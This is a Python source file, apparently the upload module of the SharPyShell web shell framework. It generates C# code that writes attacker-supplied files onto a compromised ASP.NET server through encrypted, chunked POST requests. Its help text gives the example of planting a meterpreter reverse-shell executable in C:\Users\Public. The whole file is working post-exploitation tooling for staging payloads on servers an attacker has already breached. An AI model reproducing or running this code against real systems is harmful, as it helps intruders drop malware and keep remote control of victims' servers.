from core.Module import Module, ModuleException
import ntpath
import traceback


class UploadModuleException(ModuleException):
    pass


class Upload(Module):
    _exception_class = UploadModuleException
    short_help = "Upload a file to the server"
    complete_help = r"""
        This module permits to upload a file from your local machine to the target server.
        In this module has been considered the limit of the data you can send/receive through post request.
        So if a file is larger than 100 KB it will be splitted into multiple requests over the network.
        The chunk size parameter could be modified.
        
        Usage:
            #upload local_input_path [remote_output_path] [chunk_size]
            
        Positional arguments:
            local_input_path                The file path you want to download from the remote server
            remote_output_path              The path where the file will be saved on your local machine
                                            Default: current working directory + original filename
            chunk_size                      The maximum limit of a chunk to be transferred over the network
                                            Default: 102400
        
        Examples:
            Upload a meterpreter agent:            
                #upload /tmp/revshell.exe
            Upload a meterpreter agent to C:\Users\Public directory:            
                #upload /tmp/revshell.exe C:\Users\Public\revshell.exe
            Upload a meterpreter agent to C:\Users\Public directory splitting into multiple requests of 1 KB:            
                #upload /tmp/revshell.exe C:\Users\Public\revshell.exe 1024
    """

    _runtime_code = r"""
            using System;using System.IO;using System.Diagnostics;using System.Text;
            public class SharPyShell{                    
                byte[] Upload(string path, byte[] file_bytes){
                    byte[] upload_response=Encoding.UTF8.GetBytes("File uploaded correctly to: " + path);
                    try{
                        System.IO.File.WriteAllBytes(path, file_bytes);
                    }
                    catch (Exception e){
                        upload_response = Encoding.UTF8.GetBytes("{{{SharPyShellError}}}\n" + e);
                    }
                    return upload_response;
                }
                public byte[] ExecRuntime(){
                    byte[] file_bytes = %s ;
                    byte[] output_func=Upload(@"%s", file_bytes);
                    return(output_func);
                }
            }
    """

    __runtime_code_split_file = r"""
            using System;using System.IO;using System.Diagnostics;using System.Text;
            public class SharPyShell{                    
                byte[] Upload(string path, byte[] file_bytes){
                    byte[] upload_response=Encoding.UTF8.GetBytes("File uploaded correctly to: " + path);
                    try{
                        using (FileStream stream = new FileStream(path, FileMode.Append))
                        {
                            stream.Write(file_bytes, 0, file_bytes.Length);
                        }
                    }
                    catch (Exception e){
                        upload_response = Encoding.UTF8.GetBytes("{{{SharPyShellError}}}\n" + e);
                    }
                    return upload_response;
                }
                public byte[] ExecRuntime(){
                    byte[] file_bytes = %s ;
                    byte[] output_func=Upload(@"%s", file_bytes);
                    return(output_func);
                }
            }
    """

    __runtime_code_init_file = r"""
                using System;using System.IO;using System.Diagnostics;using System.Text;
                public class SharPyShell{                    
                    string InitFile(string path){
                        string output = "{{{SharPyShellSuccess}}} File initialized correctly.";
                        try{
                            if(File.Exists(path))
                            {
                                File.Delete(path);
                            }
                        }
                        catch (Exception e){
                            output = "{{{SharPyShellError}}}\n" + e;
                        }
                        return output;
                    }
                    public byte[] ExecRuntime(){
                        string output_func=InitFile(@"%s");
                        byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
                        return(output_func_byte);
                    }
                 }
        """

    __default_chunk_size = 102400

    def __init_file(self, path):
        code = self.__runtime_code_init_file % path
        encrypted_request = self._encrypt_request(code)
        encrypted_response = self._post_request(encrypted_request)
        decrypted_response = self._decrypt_response(encrypted_response)
        parsed_response = self._parse_response(decrypted_response)
        return parsed_response

    def __parse_run_args(self, args):
        if len(args) < 1:
            raise self._exception_class('#upload: Not enough arguments. 1 Argument required. \n')
        args_parser = {k: v for k, v in enumerate(args)}
        upload_input_path = args_parser.get(0)
        filename = ntpath.basename(upload_input_path)
        default_upload_output_path = self._module_settings['working_directory'] + '\\' + filename
        upload_output_path = args_parser.get(1, default_upload_output_path)
        chunk_size = int(args_parser.get(2, self.__default_chunk_size))
        return upload_input_path, upload_output_path, chunk_size

    def _create_request(self, args):
        def split_file_to_array_bytes(binary_file, chunk_size_arg):
            def chunks(l, n):
                for i in range(0, len(l), n):
                    yield l[i:i + n]
            return list(chunks(binary_file, chunk_size_arg))

        def generate_byte_file_string(byte_arr):
            return '{' + ",".join('0x{:02x}'.format(x) for x in byte_arr) + '}'

        upload_input_path, upload_output_path, chunk_size = args
        with open(upload_input_path, 'rb') as bin_file:
            byte_arr_file = bytearray(bin_file.read())
        output_code_arr = []
        if len(byte_arr_file) <= chunk_size:
            byte_file_string = generate_byte_file_string(byte_arr_file)
            code = self._runtime_code % (byte_file_string, upload_output_path)
            output_code_arr += [code]
        else:
            output_code_arr = []
            chunked_byte_arr = split_file_to_array_bytes(byte_arr_file, chunk_size)
            for chunk in chunked_byte_arr:
                byte_file_string = generate_byte_file_string(chunk)
                code = self.__runtime_code_split_file % (byte_file_string, upload_output_path)
                output_code_arr += [code]
        return output_code_arr

    def run(self, args):
        parsed_response = ''
        try:
            upload_input_path, upload_output_path, chunk_size = self.__parse_run_args(args)
            self.__init_file(upload_output_path)
            requests = self._create_request([upload_input_path, upload_output_path, chunk_size])
            for i, req in enumerate(requests):
                encrypted_request = self._encrypt_request(req)
                encrypted_response = self._post_request(encrypted_request)
                decrypted_response = self._decrypt_response(encrypted_response)
                parsed_response = self._parse_response(decrypted_response)
                if len(requests) > 1:
                    print ('Chunk ' + str(i + 1) + ' --> ' + str(chunk_size*i) + ' - ' + str(chunk_size*i+chunk_size) +\
                          ' bytes written correctly to ' + upload_output_path)
        except ModuleException as module_exc:
            parsed_response = str(module_exc)
        except Exception:
            parsed_response = '{{{' + self._exception_class.__name__ + '}}}' + '{{{PythonError}}}\n' +\
                              str(traceback.format_exc())
        return parsed_response
